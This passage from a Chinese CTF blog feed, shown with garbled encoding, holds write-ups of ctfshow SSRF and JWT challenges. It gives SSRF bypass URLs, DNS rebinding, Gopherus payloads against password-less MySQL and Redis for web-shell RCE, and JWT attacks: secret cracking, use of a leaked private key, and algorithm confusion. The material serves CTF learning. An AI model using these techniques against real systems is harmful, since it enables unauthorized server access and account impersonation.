class="line">url=http://0/flag.php</span><br><span class="line"># 0åœ¨linuxç³»ç»Ÿä¸­ä¼šè§£ææˆ127.0.0.1åœ¨windowsä¸­è§£ææˆ0.0.0.0</span><br></pre></td></tr></table></figure><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120170031431.png" alt="image-20230120170031431"></p><p>æˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹ä¸Šå›¾ä¸­å‡ºç°çš„å‡½æ•°çš„æ„æ€</p><p><strong>å…ˆæ¥çœ‹ä¸‹ gethostbyname å‡½æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gethostbyname â€” è¿”å›ä¸»æœºåå¯¹åº”çš„ IPv4åœ°å€</span><br></pre></td></tr></table></figure><p><strong>filter_var()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># php filterå‡½æ•°</span><br><span class="line">filter_var()è·å–ä¸€ä¸ªå˜é‡ï¼Œå¹¶è¿›è¡Œè¿‡æ»¤</span><br><span class="line">filter_var_array()è·å–å¤šä¸ªå˜é‡ï¼Œå¹¶è¿›è¡Œè¿‡æ»¤</span><br><span class="line">......</span><br><span class="line"># PHP è¿‡æ»¤å™¨</span><br><span class="line">FILTER_VALIDATE_IPæŠŠå€¼ä½œä¸º IP åœ°å€æ¥éªŒè¯ï¼Œåªé™ IPv4 æˆ– IPv6 æˆ– ä¸æ˜¯æ¥è‡ªç§æœ‰æˆ–è€…ä¿ç•™çš„èŒƒå›´</span><br><span class="line">FILTER_FLAG_IPV4 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv4 IPï¼ˆæ¯”å¦‚ 255.255.255.255ï¼‰</span><br><span class="line">FILTER_FLAG_IPV6 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv6 IPï¼ˆæ¯”å¦‚ 2001:0db8:85a3:08d3:1319:8a2e:0370:7334ï¼‰</span><br><span class="line">FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰</span><br><span class="line">FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚</span><br></pre></td></tr></table></figure><p>å› ä¸ºä»£ç ä¸­ä½¿ç”¨äº† gethostbyname è·å–äº†çœŸå® IP åœ°å€ï¼Œæ‰€ä»¥åŸŸåæŒ‡å‘æ–¹æ³•ä¸èƒ½å†ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ 302 è·³è½¬æ–¹æ³•å’Œ dns rebinding æ–¹æ³•</p><p>DNS rebindingï¼ˆDNSé‡æ–°ç»‘å®šæ”»å‡»ï¼‰</p><p>æ”»å‡»é‡ç‚¹åœ¨äºDNSæœåŠ¡èƒ½å¤Ÿåœ¨ä¸¤æ¬¡DNSæŸ¥è¯¢ä¸­è¿”å›ä¸ç”¨çš„IPåœ°å€ï¼Œç¬¬ä¸€æ¬¡æ˜¯çœŸæ­£çš„IPï¼Œç¬¬äºŒæ¬¡æ˜¯æ”»å‡»ç›®æ ‡IPåœ°å€ï¼Œç”šè‡³å¯ä»¥é€šè¿‡è¿™ç§æ”»å‡»æ–¹æ³•ç»•è¿‡åŒæºç­–ç•¥</p><p>å›åˆ°é¢˜ç›®ï¼Œåœ¨é¢˜ç›®ä»£ç ä¸­ä¸€å…±å¯¹åŸŸåè¿›è¡Œäº†ä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡æ˜¯ gethostbyname æ–¹æ³•ï¼Œç¬¬äºŒæ¬¡åˆ™æ˜¯ file_get_contents æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥é€šè¿‡ ceye.io æ¥å®ç°æ”»å‡»ï¼ŒDNS Rebinding ä¸­è®¾ç½®ä¸¤ä¸ª IPï¼Œä¸€ä¸ªæ˜¯ 127.0.0.1 å¦ä¸€ä¸ªæ˜¯éšä¾¿å¯ä»¥è®¿é—®çš„ IP</p><p><img src="../images/image-20230120172635780.png" alt="image-20230120172635780"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http://r.è‡ªå·±çš„åŸŸå.ceye.io/flag.php</span><br><span class="line"># æ³¨æ„å‰è¾¹è¦åŠ ä¸Šr.</span><br><span class="line"># å¤šæ¬¡å°è¯•</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230120174137568.png" alt="image-20230120174137568"></p><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120174311310.png" alt="image-20230120174311310"></p><p>url å­—ç¬¦ä¸²è¦ä»¥ <code>http://ctf</code>å¼€å¤´ï¼Œ<code>show</code>ç»“å°¾</p><p>è¿™é‡Œåœ¨è®²ä¸€éè¿™ä¸ª<code>parse_url</code>å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†</span><br><span class="line">æ•°ç»„ä¸­å¯èƒ½çš„é”®æœ‰ä»¥ä¸‹å‡ ç§ï¼š</span><br><span class="line">scheme - å¦‚ http</span><br><span class="line">host</span><br><span class="line">port</span><br><span class="line">user</span><br><span class="line">pass</span><br><span class="line">path</span><br><span class="line">query - åœ¨é—®å· ? ä¹‹å</span><br><span class="line">fragment - åœ¨æ•£åˆ—ç¬¦å· # ä¹‹å</span><br><span class="line">    </span><br><span class="line"># ä¾‹ï¼š</span><br><span class="line">&lt;?php</span><br><span class="line">$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line">print_r(parse_url($url));</span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;    </span><br><span class="line"># è¾“å‡º</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°±æ˜¯æ ¹æ®è¿™ä¸ªå‡½æ•°çš„ç‰¹æ€§æ¥è·å–flag</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure><h2 id="web359-æ‰“æ— å¯†ç çš„mysql"><a href="#web359-æ‰“æ— å¯†ç çš„mysql" class="headerlink" title="web359(æ‰“æ— å¯†ç çš„mysql)"></a>web359(æ‰“æ— å¯†ç çš„mysql)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230120180442260.png" alt="image-20230120180442260"></p><p><img src="../images/image-20230120180638216.png" alt="image-20230120180638216"></p><p>ç‚¹å‡»loginæŠ“åŒ…å‘ç°å­˜åœ¨returlè¿™ä¸ªä¸œè¥¿ï¼Œåé¢è¿˜è·Ÿç€httpç½‘å€ï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯ssrf</p><p>å·¥å…·ä¸‹è½½åœ°å€<code>https://github.com/tarunkant/Gopherus</code></p><p>ä½¿ç”¨ gopher åè®®å»æ‰“ mysql</p><p>ç”¨ gopherus å·¥å…·ç”Ÿæˆ payload</p><p>ä½¿ç”¨æ–¹æ³•å¯ä»¥è‡ªå·±å»çœ‹ï¼Œè¿™é‡Œçš„è¯ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œæˆ‘pythonç”¨ä¸äº†,å°±ç›´æ¥ç”¨ä¸‹é¢çš„è¯­å¥äº†</p><p><img src="../images/image-20230120230529676.png" alt="image-20230120230529676"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopherus --exploit mysql</span><br></pre></td></tr></table></figure><p>è®°å¾—å¾—æŠŠ_åé¢çš„urlç¼–ç åœ¨è¿›è¡Œä¸€æ¬¡ç¼–ç ï¼ˆé˜²æ­¢å‡ºç°ç‰¹æ®Šå­—ç¬¦ï¼Œåç«¯ curl æ¥æ”¶åˆ°å‚æ•°åä¼šé»˜è®¤è§£ç ä¸€æ¬¡ï¼‰   ç„¶åè¿›è¡ŒæŠ“åŒ…å‘é€ï¼Œç„¶ååœ¨è®¿é—®2.phpè¿›è¡Œrce</p><p><img src="../images/image-20230120230800699.png" alt="image-20230120230800699"></p><p><img src="../images/image-20230120230910057.png" alt="image-20230120230910057"></p><h2 id="web360-Redis"><a href="#web360-Redis" class="headerlink" title="web360(Redis)"></a>web360(Redis)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230121163014199.png" alt="image-20230121163014199"></p><p>ä»£ç å…¶å®å’Œå‰é¢çš„å¸¸è§„ssrfé¢˜å·®ä¸å¤š</p><p>å¯¹redisçš„ä»‹ç» â€”-&gt;   <a href="https://www.cnblogs.com/powertoolsteam/p/redis.html">https://www.cnblogs.com/powertoolsteam/p/redis.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ä»€ä¹ˆæ˜¯Redisæœªæˆæƒè®¿é—®ï¼Ÿ</span><br><span class="line"></span><br><span class="line">Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„ config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨</span><br><span class="line"></span><br><span class="line">ç®€å•è¯´ï¼Œæ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</span><br><span class="line"></span><br><span class="line">redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘</span><br><span class="line">æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç è¿œç¨‹ç™»å½•redisæœåŠ¡</span><br></pre></td></tr></table></figure><p>å¯¹redisè¿›è¡Œæ“ä½œå¾—ç”¨åˆ°dictåè®®  â€”-&gt;   <strong>dictåè®®ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</strong></p><p><img src="../images/image-20230121163628812.png" alt="image-20230121163628812"></p><p>å‡ºç°è¿™ç§æƒ…å†µè¯´æ˜å­˜åœ¨redisæœåŠ¡ã€‚</p><p>è¿™é‡Œå°±ç›´æ¥å¯ä»¥åˆ©ç”¨gopheruså·¥å…·ï¼Œè¿™ä¸ªå·¥å…·å¯ä»¥ç”Ÿæˆå¤šç§payload</p><p><img src="../images/image-20230121163810218.png" alt="image-20230121163810218"></p><p>è¿™é“é¢˜å°±ç›´æ¥ç”Ÿæˆpayloadæ‹¿æ¥æ‰“å°±è¡Œäº†ã€‚</p><p><img src="../images/image-20230121170818566.png" alt="image-20230121170818566"></p><p>ç„¶åå°†_åé¢çš„è¯­å¥è¿›è¡Œurlç¼–ç å°±è¡Œäº†ï¼Œpoståï¼Œè®¿é—®shell.php,ç„¶åè¿›è¡Œrceå°±è¡Œäº†ã€‚</p><p><img src="../images/image-20230121171016810.png" alt="image-20230121171016810"></p><p>å‡ºç°è¿™ç§æƒ…å†µå°±æ˜¯shellå†™å…¥æˆåŠŸï¼Œç„¶åè¿›è¡Œrceå°±è¡Œäº†ã€‚</p><p>è¿™ç¯‡æ–‡ç« çš„è¯å†™çš„å¾ˆå¥½åœ¨ç»“å°¾çš„è¯ç»™äº†ä¸€äº›è¡¥å…… â€”&gt; <a href="https://blog.csdn.net/q20010619/article/details/120536552">https://blog.csdn.net/q20010619/article/details/120536552</a></p><p>å¯ä»¥è‡ªå·±å»å‚è€ƒä¸€ä¸‹</p><p>è¿™ç¯‡æ–‡ç« çš„è¯æ¦‚æ‹¬äº†å‡ ä¹å…¨éƒ¨çš„SSRFæ”»å‡»å†…å®¹  â€”â€”-&gt;   <a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF ctfshow åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-JWT åˆ·é¢˜è®°å½•</title>
      <link href="/posts/f8d4789.html"/>
      <url>/posts/f8d4789.html</url>
      
        <content type="html"><![CDATA[<p>JWT â€”-&gt;<a href="https://zhuanlan.zhihu.com/p/86937325">https://zhuanlan.zhihu.com/p/86937325</a></p><p>å¯ä»¥å»çœ‹çœ‹è¿™ç¯‡æ–‡ç« äº†è§£ä¸€ä¸‹å•¥æ˜¯JWT(å¦‚æœè§‰å¾—ä¸å¥½ï¼Œå¯ä»¥è‡ªå·±å»æœä¸€ä¸‹ï¼Œç½‘ä¸ŠæŒºå¤šäººè®²çš„è¿™ä¸ª)</p><p>jwtè§£å¯†ç½‘ç«™<code>https://jwt.io/</code></p><p>å‰ç½®çŸ¥è¯†<br>JWTæ”¯æŒå°†ç®—æ³•è®¾å®šä¸ºâ€œNoneâ€ã€‚å¦‚æœâ€œalgâ€å­—æ®µè®¾ä¸ºâ€œ Noneâ€ï¼Œé‚£ä¹ˆç­¾åä¼šè¢«ç½®ç©ºï¼Œè¿™æ ·ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„ã€‚<br>è®¾å®šè¯¥åŠŸèƒ½çš„æœ€åˆç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ã€‚ä½†æ˜¯ï¼Œè‹¥ä¸åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å…³é—­è¯¥åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å°†algå­—æ®µè®¾ç½®ä¸ºâ€œNoneâ€æ¥ä¼ªé€ ä»–ä»¬æƒ³è¦çš„ä»»ä½•tokenï¼Œæ¥ç€ä¾¿å¯ä»¥ä½¿ç”¨ä¼ªé€ çš„tokenå†’å……ä»»æ„ç”¨æˆ·ç™»é™†ç½‘ç«™ã€‚</p><p>è¿™ç¯‡æ–‡ç« ä»‹ç»äº†jwtå’Œå…¶çš„å‡ ç§æ”»å‡»æ–¹æ³•  â€”-&gt;  <a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p><p>è¿™ç¯‡æ–‡ç« å‡ ä¹æ¦‚æ‹¬äº†æ‰€æœ‰çš„jwtæ”»å‡»çš„æ–¹æ³•  â€”-&gt;  <a href="https://www.cnblogs.com/HelloCTF/p/15748380.html">https://www.cnblogs.com/HelloCTF/p/15748380.html</a></p><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230119164512413.png" alt="image-20230119164512413"></p><p>ç„¶åæŸ¥çœ‹æºä»£ç å‘ç°äº†æç¤ºã€‚</p><p><img src="../images/image-20230119164723959.png" alt="image-20230119164723959"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œè¯´ä¸€ä¸‹url/admin    å’Œ  url/admin/çš„åŒºåˆ«</span><br><span class="line">å‰è€…æ˜¯è®¿é—®adminè¿™ä¸ªæ–‡ä»¶   åè€…æ˜¯è®¿é—®amdinç›®å½•ä¸‹çš„index.php or  index.jsp  index.aspx</span><br></pre></td></tr></table></figure><p>payload  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å»è®¿é—®/admin/ç„¶åå°±æŠŠcookieæ‹¿å‡ºæ¥è¿›è¡Œbase64è§£ç ï¼Œç„¶åæŠŠuserä¿®æ”¹æˆadminï¼Œåœ¨è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åé‡æ–°æäº¤cookieåˆ°/admin/ï¼Œå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</span><br></pre></td></tr></table></figure><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>é¢˜ç›®<img src="../images/image-20230119165715347.png" alt="image-20230119165715347"></p><p><img src="../images/image-20230119195246730.png" alt="image-20230119195246730"></p><p>æ‹¿ç€cookieå»jwt.ioè§£å¯†å¹³å°æŸ¥çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å­˜åœ¨HS256åŠ å¯†çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å»æƒ³åŠæ³•è·å¾—å¯†é’¥äº†ã€‚</p><p>ç„¶åç›²çŒœä¸€ä¸‹æ˜¯123456ï¼Œç»“æœå¯¹äº†ï¼Œç„¶åè®¿é—®/admin/å°±èƒ½æ‹¿åˆ°flagäº†ã€‚(è¿˜æ˜¯å¾—æŠŠuserä¿®æ”¹æˆadmin)</p><h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230119195558015.png" alt="image-20230119195558015"></p><p>è¿˜æ˜¯è¿™ä¸ªç©æ„</p><p>è¿˜æ˜¯å’Œweb348ä¸€æ ·ï¼Œç›´æ¥çŒœå¯†ç æ˜¯123456.</p><p>ç„¶åå°±å¯ä»¥è§£å‡ºæ¥äº†ã€‚</p><h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230119200532621.png" alt="image-20230119200532621"></p><p>åˆ©ç”¨jwtçˆ†ç ´æ”»å‡»çˆ†ç ´<br>ä¸‹è½½åœ°å€<code>https://github.com/brendan-rius/c-jwt-cracker</code>å…·ä½“å®‰è£…æ–¹æ³•æ–‡æ¡£ä¸­æœ‰ã€‚<br>ä½¿ç”¨æ–¹æ³• <code>./jwtcrack jwt</code></p><p><img src="../images/image-20230119202324686.png" alt="image-20230119202324686"></p><p>è·‘åŠå¤©æ‰ç»™æˆ‘è·‘å‡ºæ¥</p><p><img src="../images/image-20230119202436473.png" alt="image-20230119202436473"></p><p>ç„¶åå°±å»ä¿®æ”¹cookieè®¿é—®/admin/å°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><h2 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h2><p><img src="../images/image-20230119203323957.png" alt="image-20230119203323957"></p><p>è¿™é‡Œæ‹¿åˆ°cookieå»è®¿é—®çš„è¯ï¼Œå¾—åˆ°è¿™é‡Œæ˜¯RS256åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RS256ç®—æ³•åˆ™ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç§é’¥ç”Ÿæˆjwtï¼Œåˆ©ç”¨å…¬é’¥è§£å¯†jwtï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æœ‰ç§é’¥ç„¶åè‡ªå·±é‡æ–°ç”Ÿæˆå°±å¯ä»¥äº†ã€‚<br>è®¿é—®/private.keyå¾—åˆ°ç§é’¥  è¿™é‡Œçš„è€ƒç‚¹å°±æ˜¯ç§é’¥æ³„éœ²</p><p><img src="../images/image-20230119205202772.png" alt="image-20230119205202772"></p><p>è¿™é‡Œç»™çš„æ˜¯é¢˜ç›®çš„æºç ã€‚</p><p><strong>è§£æ³•</strong></p><p><img src="../images/image-20230119205933972.png" alt="image-20230119205933972"></p><p>å…ˆåˆ›å»ºä¸€ä¸ªpublicç›®å½•</p><p>ç„¶åè¿›å…¥æ–°å»ºçš„routeç›®å½•ï¼Œä¿®æ”¹ä¸€ä¸‹æºç ï¼ŒæŠŠé¢˜ç›®ç»™çš„æºç å¤åˆ¶è¿›å»ã€‚(æ³¨æ„æŠŠuseræ”¹æˆadmin)</p><p><img src="../images/image-20230119210233365.png" alt="image-20230119210233365"></p><p>ç„¶åæŠŠé¢˜ç›®ä¸Šçš„private.keyä¸‹è½½åˆ°publicç›®å½•</p><p><img src="../images/image-20230119210443791.png" alt="image-20230119210443791"></p><p><a href="https://www.bilibili.com/video/BV1vU4y187HE/?p=5&amp;spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">web349_å“”å“©å“”å“©_bilibili</a></p><p>çœ‹è¿™ä¸ªè§†é¢‘è·Ÿç€åšå§ï¼Œæˆ‘å†™ä¸ä¸‹å»äº†ï¼Œå°±æ˜¯è·Ÿç€è¿™ä¸ªè§†é¢‘åšçš„ï¼Œç„¶ååœ¨é‡åˆ°ç›¸åŒçš„é¢˜å¯ä»¥è·Ÿæ®è¿™ä¸ªæ¨¡æ¿æ¥åšï¼Œå› ä¸ºç¯å¢ƒå·²ç»æ­å¥½äº†ï¼Œåªéœ€è¦æŠŠé¢˜ç›®ç»™çš„æºç ç»™è¿›è¡Œä¿®æ”¹å°±è¡Œäº†ã€‚</p><h2 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230119214505677.png" alt="image-20230119214505677"></p><p>è®¿é—®/public.keyè·å¾—å…¬é’¥<br>jwtæ”»å‡»å‚è€ƒæ–‡ç« <code>https://xz.aliyun.com/t/2338</code><br>è¿™ä¸ªé¢˜æ˜¯åˆ©ç”¨çš„ç¬¬ä¸‰ç§<br><img src="../images/20201230165107811.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="../images/image-20230119215019473.png" alt="image-20230119215019473"></p><p>è¿™é“é¢˜æŸ¥çœ‹æºç å‘ç°private.keyæ˜¯ç»™æ”¾åˆ°routeç›®å½•ä¸‹äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸å¯ä»¥å»æ‹¿åˆ°private.key,ç„¶åè¿›è¡Œç”Ÿæˆæ–°çš„cookieäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—é€šè¿‡ä¿®æ”¹åŠ å¯†ç®—æ³•ï¼Œç”¨å…¬é’¥æ¥è§£é¢˜ã€‚</p><p><img src="../images/image-20230119215315985.png" alt="image-20230119215315985"></p><p>ä¿®æ”¹ä¸€ä¸‹routeé‡Œçš„ä»£ç ï¼Œç„¶ånpm start å¯åŠ¨3000ç«¯å£ï¼Œæ‹¿åˆ°cookieï¼Œå°±å»é¢˜ç›®ä¿®æ”¹cookieï¼Œpostå‘åŒ…å°±å¯ä»¥äº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow JWT åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸‰æ ¡è”åˆè®­ç»ƒèµ›web wp</title>
      <link href="/posts/47456b21.html"/>
      <url>/posts/47456b21.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="BuyBuyBuy"><a href="#BuyBuyBuy" class="headerlink" title="BuyBuyBuy"></a><strong>BuyBuyBuy</strong></h3><p><img src="../images/image-20230115170900853.png" alt="image-20230115170900853"></p><p>æ‰“å¼€é¢˜ç›®  å‘ç°æ˜¯ä¹°flagçš„é¢˜ç›® é¢˜ç›®è¿˜ç»™äº†æºç ï¼Œè¿™ä¸æ˜¯é€åˆ†å—(ç‹—å¤´)</p><p><img src="../images/image-20230115171139731.png" alt="image-20230115171139731"></p><p>ä¸€å…±ä¸¤å¤„åœ°æ–¹ï¼Œ<strong>/loginå’Œ/buyflag</strong>  è€Œä¸”é€šè¿‡æŸ¥çœ‹æºç å’Œé¢˜ç›®çš„cookieï¼Œå‘ç°æ˜¯ä¸€é“jwtç±»å‹çš„é¢˜ç›®</p><p>ç„¶åå°±å»äº†è§£äº†ä¸€ä¸‹ï¼Œjwtæ˜¯ä»€ä¹ˆï¼Œç„¶åå°±çŸ¥é“æ˜¯é€šè¿‡ä¿®æ”¹cookieæ¥è·å¾—flagçš„ã€‚</p><p>jwtè§£å¯†ç½‘ç«™<code>https://jwt.io/</code></p><p><img src="../images/image-20230115171545935.png" alt="image-20230115171545935"></p><p>è®¿é—®/loginç„¶åè¾“å…¥getä¼ ä¸ªusrnameçš„å‚æ•°ï¼Œå°±å¯ä»¥æ‹¿åˆ°cookieå€¼ï¼Œç„¶åæ‹¿å»jwtè§£å¯†ç½‘ç«™å»è§£å¯†</p><p><img src="../images/image-20230115171709619.png" alt="image-20230115171709619"></p><p><strong>secretä¸çŸ¥é“</strong>    å¤§æ¦‚å»æ‰¾äº†æ‰¾ï¼Œæ²¡æ‰¾åˆ°ï¼Œå°±ç›´æ¥åˆ©ç”¨å·¥å…·å»ç ´è§£æ‹¿åˆ°secretäº†ã€‚</p><p><strong>åˆ©ç”¨jwtçˆ†ç ´æ”»å‡»çˆ†ç ´</strong><br>ä¸‹è½½åœ°å€<code>https://github.com/brendan-rius/c-jwt-cracker</code>å…·ä½“å®‰è£…æ–¹æ³•æ–‡æ¡£ä¸­æœ‰ã€‚<br>ä½¿ç”¨æ–¹æ³• ./jwtcrack jwt</p><p><img src="../images/image-20230115171846564.png" alt="image-20230115171846564"></p><p>ç„¶åæ‹¿åˆ°secretï¼Œå°±å»jwtè§£å¯†ç½‘ç«™å»ä¿®æ”¹moneyå’Œsecret</p><p><img src="../images/image-20230115172145729.png" alt="image-20230115172145729"></p><p>ç„¶åå°±å»è®¿é—®/buyflagå»ä¹°flagã€‚</p><p><img src="../images/image-20230115172114903.png" alt="image-20230115172114903"></p><p>ç„¶åå°±æ‹¿åˆ°flagäº†ã€‚</p><h3 id="EasyRCE"><a href="#EasyRCE" class="headerlink" title="EasyRCE"></a><strong>EasyRCE</strong></h3><p><img src="../images/image-20230115172921998.png" 